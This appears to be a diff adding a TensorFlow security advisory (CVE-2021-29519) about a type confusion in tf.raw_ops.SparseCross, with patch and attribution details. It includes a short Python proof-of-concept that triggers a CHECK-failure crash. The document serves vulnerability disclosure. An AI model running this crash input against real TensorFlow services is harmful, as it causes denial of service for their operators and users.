@@ -1,0 +1,63 @@
+<h2>TFSA-2021-008: <code>CHECK</code>-fail in <code>SparseCross</code> due to type confusion</h2>
+<h3>CVE Number</h3>
+<p>CVE-2021-29519</p>
+<h3>Impact</h3>
+<p>The API of <code>tf.raw_ops.SparseCross</code> allows combinations which would
+result in a <code>CHECK</code>-failure and denial of service:</p>
+<p>```python
+import tensorflow as tf</p>
+<p>hashed_output = False
+num_buckets = 1949315406
+hash_key = 1869835877
+out_type = tf.string
+internal_type = tf.string</p>
+<p>indices_1 = tf.constant([0, 6], shape=[1, 2], dtype=tf.int64)
+indices_2 = tf.constant([0, 0], shape=[1, 2], dtype=tf.int64)
+indices = [indices_1, indices_2]</p>
+<p>values_1 = tf.constant([0], dtype=tf.int64)
+values_2 = tf.constant([72], dtype=tf.int64)
+values = [values_1, values_2]</p>
+<p>batch_size = 4
+shape_1 = tf.constant([4, 122], dtype=tf.int64)
+shape_2 = tf.constant([4, 188], dtype=tf.int64)
+shapes = [shape_1, shape_2]</p>
+<p>dense_1 = tf.constant([188, 127, 336, 0], shape=[4, 1], dtype=tf.int64)
+dense_2 = tf.constant([341, 470, 470, 470], shape=[4, 1], dtype=tf.int64)
+dense_3 = tf.constant([188, 188, 341, 922], shape=[4, 1], dtype=tf.int64)
+denses = [dense_1, dense_2, dense_3]</p>
+<p>tf.raw_ops.SparseCross(indices=indices, values=values, shapes=shapes, dense_inputs=denses, hashed_output=hashed_output,
+                       num_buckets=num_buckets, hash_key=hash_key, out_type=out_type, internal_type=internal_type)
+```</p>
+<p>The above code will result in a <code>CHECK</code> fail in
+<a href="https://github.com/tensorflow/tensorflow/blob/3d782b7d47b1bf2ed32bd4a246d6d6cadc4c903d/tensorflow/core/framework/tensor.cc#L670-L675"><code>tensor.cc</code></a>:</p>
+<p><code>cc
+void Tensor::CheckTypeAndIsAligned(DataType expected_dtype) const {
+  CHECK_EQ(dtype(), expected_dtype)
+      &lt;&lt; " " &lt;&lt; DataTypeString(expected_dtype) &lt;&lt; " expected, got "
+      &lt;&lt; DataTypeString(dtype());
+  ...
+}</code></p>
+<p>This is because the
+<a href="https://github.com/tensorflow/tensorflow/blob/3d782b7d47b1bf2ed32bd4a246d6d6cadc4c903d/tensorflow/core/kernels/sparse_cross_op.cc#L114-L116">implementation</a>
+is tricked to consider a tensor of type <code>tstring</code> which in fact contains
+integral elements:</p>
+<p><code>cc
+  if (DT_STRING == values_.dtype())
+      return Fingerprint64(values_.vec&lt;tstring&gt;().data()[start + n]);
+  return values_.vec&lt;int64&gt;().data()[start + n];</code></p>
+<p>Fixing the type confusion by preventing mixing <code>DT_STRING</code> and <code>DT_INT64</code> types
+solves this issue.</p>
+<h3>Patches</h3>
+<p>We have patched the issue in GitHub commit
+<a href="https://github.com/tensorflow/tensorflow/commit/b1cc5e5a50e7cee09f2c6eb48eb40ee9c4125025">b1cc5e5a50e7cee09f2c6eb48eb40ee9c4125025</a>.</p>
+<p>The fix will be included in TensorFlow 2.5.0. We will also cherrypick this
+commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow
+2.1.4, as these are also affected and still in supported range.</p>
+<h3>For more information</h3>
+<p>Please consult <a href="https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md">our security
+guide</a> for
+more information regarding the security model and how to contact us with issues
+and questions.</p>
+<h3>Attribution</h3>
+<p>This vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu
+X-Team.</p>
